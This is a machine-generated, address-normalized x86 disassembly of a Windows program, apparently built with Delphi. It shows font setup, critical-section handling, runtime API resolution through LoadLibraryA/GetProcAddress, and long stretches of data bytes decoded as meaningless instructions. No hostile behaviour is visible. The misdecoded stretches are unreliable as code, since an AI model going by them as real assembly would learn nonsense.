mov [ rw-data ] eax
pop ebx
retn
sub_42a2c0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
movzx ebx [ esp + 0x34 ]
sub_42a304
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a407
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a3bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
call sub_420e5c
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_420fe8
test al al
je r-xdata
call sub_42a2c0
cmp al 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a3c6
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_421600
mov eax [ ebp - 0x8 ]
call sub_420e2c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
sub_42a3c6
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a40e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x108 ]
mov edx [ ebp - 0x4 ]
mov ecx 0xff
call sub_4050fc
lea edx [ ebp - 0x108 ]
mov eax rw-data
mov cl 0x1f
call sub_403618
sub_42a4e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a518
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_42a710
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42a55c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42a544
xor eax eax
push ebp
push sub_42a5fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a604
mov eax [ ebp - 0x4 ]
call sub_42a550
retn
mov eax 0x10
call sub_402d28
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a610
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42a610
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a6ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4288e0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_423fe4
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_423ec8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_415370
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_42426c
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424514
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42859c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a710
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a544
xor eax eax
push ebp
push sub_42a75d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a764
mov eax [ ebp - 0x4 ]
call sub_42a550
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a764
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402d44
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov eax esi
call sub_403f64
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42a544
xor eax eax
push ebp
push sub_42a75d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a764
mov eax [ ebp - 0x4 ]
call sub_42a550
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a790
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423140
push eax
mov eax ebx
call sub_423140
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42a55c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42a7c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a891
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a898
retn
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
call sub_427548
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_405af0
sub_42a89c
call sub_42eb49
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
test al 0x42
add [ eax + eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax - 0x57 ] ch
inc edx
add [ ecx + ebp * 4 + 0x42 ] ch
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4c ] si
test eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
test eax 0x1c0042
add [ eax ] al
pushfd
test al 0x42
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x1fffbd57 ] dh
test eax 0xa9ec0042
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42a970
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a9b0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_42aa08
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42a9f8
xor eax eax
push ebp
push sub_42abbf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abc6
mov eax [ rw-data ]
call sub_42aa00
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42abc8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42a9f8
xor eax eax
push ebp
push sub_42af7b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af82
mov eax [ rw-data ]
call sub_42aa00
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42b32c
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42b354
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b39c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b3a3
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403f64
call sub_42aa08
cmp [ rw-data ] 0x0
jg r-xdata
sub_42b3c8
adc al 0xb4
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4b ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 4 - 0x4ac1ffbe ] cl
inc edx
add [ eax + 0x2 ] dh
add [ eax ] al
add al 0x81
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
clc
leave
inc edx
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] cl
out dx eax
inc ebx
add [ eax + 0x48 ] cl
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add al bl
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
inc ecx
add ah ah
fiadd [ ecx ]
jl r-xdata
add [ eax - 0x3e ] dl
inc edx
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add [ ebx + eax * 8 ] cl
inc edx
add [ esp + eax * 8 - 0x3b97ffbe ] ch
inc edx
add [ esi + eax * 8 ] dl
inc edx
add ah bl
les eax [ edx ]
mov esp es
inc edx
add [ eax - 0x3b ] al
inc edx
add [ eax - 0x3b ] bh
inc edx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov al 0xff
xor dl cl
inc edx
add [ eax - 0x36 ] dh
inc edx
add ah ch
0x42
inc esp
add [ eax ] dh
retn
sub_42b486
inc ebx
add ah bl
rol [ ebx ] 0xe4
cmove eax [ eax ]
mov dl ch
inc ebx
add [ eax ] dl
cmp al [ eax + eax - 0x30 ]
cmp al [ eax + eax - 0x3c ]
xor eax 0x3ab40044
inc esp
add [ ecx + esi * 8 ] dh
inc ebx
add ah bh
clc
inc ebx
add [ eax ] ch
pop es
inc esp
add [ eax + 0x680042c6 ] dh
mov [ edx ] sub_42c7d8
rol [ edi ] 0x44
add ah ah
pop es
inc esp
add [ eax + 0x8 ] bh
inc esp
add [ esi + eax + 0x44 ] bh
add [ eax + ecx * 8 + 0x503c0042 ] dh
inc esp
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add [ ebx + eax * 8 ] cl
inc edx
add [ esp + eax * 8 - 0x3b97ffbe ] ch
inc edx
add [ esi + eax * 8 ] dl
inc edx
add ah bl
les eax [ edx ]
mov esp es
inc edx
add [ eax - 0x3b ] al
inc edx
add [ eax - 0x3b ] bh
inc edx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov al 0xff
xor dl cl
inc edx
add [ eax - 0x36 ] dh
inc edx
add ah ch
0x42
sub_42b532
sub bl cl
inc edx
add [ eax - 0x35 ] ah
inc edx
add ah dl
leave
inc edx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
dec esi
je r-xdata
inc edx
outsd
jb r-xdata
jae r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
clc
inc eax
add [ eax ] ch
rol [ edx ] 0x1
dec eax
dec eax
jpe r-xdata
aas
jb r-xdata
outsd
insd
inc ebp
imul esi [ fs : esp + edx - 0x4c ] 0x84ec0042
inc ebx
add [ esi ] cl
add [ eax ] cl
push ebx
je r-xdata
jl r-xdata
add [ eax + 0x6c0042cf ] bl
inc edx
inc esp
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ edx + edx * 8 ] ch
inc edx
add al bl
outsb
je r-xdata
inc ebx
add [ eax + esi * 8 - 0x40cfffbd ] bh
inc ebx
add [ eax ] al
loop r-xdata
imul esp [ ebx + 0x61 ] 0x7373066c
arpl [ ecx + 0x6c ] sp
push es
jae r-xdata
inc ebx
je r-xdata
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add [ ebx + eax * 8 ] cl
inc edx
add [ esp + eax * 8 - 0x3b97ffbe ] ch
inc edx
add [ esi + eax * 8 ] dl
inc edx
add ah bl
les eax [ edx ]
mov esp es
inc edx
add [ eax - 0x3b ] al
inc edx
add [ eax - 0x3b ] bh
inc edx
add [ ecx + edx * 8 - 0x2e17ffbe ] cl
inc edx
add [ eax + eax ] al
xchg [ eax ] eax
add [ eax ] 0xb8
dec edx
call [ eax - 0x3bffbd2e ]
rol [ edx ] cl
int3
inc esp
add [ eax ] bl
insb
or dh [ ebx + 0x73 ]
push esi
add [ eax ] dh
retn
sub al 0xc3
inc edx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ ecx + edx * 2 + 0x44 ] bh
add ah ah
fiadd [ ecx ]
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc ecx
xor [ edi - 0x1dffffbd ] bh
inc edx
outsd
je r-xdata
insb
jae r-xdata
insb
jae r-xdata
inc ecx
add ah bl
fiadd [ ecx ]
or dl ah
inc ecx
shl [ eax ] 0xb6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
mov bh 0x42
add [ edx - 0x49 ] cl
add [ eax ] dl
inc eax
add al bl
add [ eax ] eax
add [ eax ] al
adc [ eax ] al
fadd [ ecx ]
add bh bh
mov eax 0x100443e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add ah cl
mov ch 0x42
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
leave
inc edx
add ah bh
inc eax
inc ecx
inc eax
add al bh
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + esi * 4 + 0x73060042 ] dl
jae r-xdata
add [ edx + eax ] bh
add al cl
mov bl 0x42
add al ch
loope r-xdata
mov bh 0x42
outsd
outsb
or al 0x73
jae r-xdata
sub_42b6a2
inc ebx
add ah bl
rol [ ebx ] 0xe4
cmove eax [ eax ]
mov dl ch
inc ebx
add [ eax ] dl
cmp al [ eax + eax - 0x30 ]
cmp al [ eax + eax - 0x3c ]
xor eax 0x3ab40044
inc esp
add [ ecx + esi * 8 ] dh
inc ebx
add ah bh
clc
inc ebx
add [ eax ] ch
pop es
inc esp
add [ eax - 0x30 ] bl
inc edx
add [ eax + edx * 8 - 0x3827ffbe ] bh
inc edx
add al al
pop es
inc esp
add ah ah
pop es
inc esp
add [ eax + 0x8 ] bh
inc esp
add [ esi + eax + 0x44 ] bh
add [ eax + ecx * 8 + 0x503c0042 ] dh
inc esp
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add [ ebx + eax * 8 ] cl
inc edx
add [ esp + eax * 8 - 0x3b97ffbe ] ch
inc edx
add [ esi + eax * 8 ] dl
inc edx
add ah bl
les eax [ edx ]
mov esp es
inc edx
add [ eax - 0x3b ] al
inc edx
add [ eax - 0x3b ] bh
inc edx
add [ ecx + edx * 8 - 0x2e17ffbe ] cl
inc edx
add [ eax + eax ] al
xchg [ eax ] eax
add [ eax ] 0xb8
dec edx
call [ eax - 0x3bffbd2e ]
rol [ edx ] cl
int3
sub_42bdbe
inc ebx
add [ eax ] cl
call sub_42be09
add [ eax + 0x1 ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
ja r-xdata
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor [ eax ] al
or edx [ edi + 0x61 ]
outsb
je r-xdata
add bh bh
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080033 ] al
outsb
inc ebx
push 0x65676e61
insb
cmp eax [ ecx ]
je r-xdata
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] eax
jb r-xdata
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
sub al ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070034 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0e00
jae r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f07003b ] al
popad
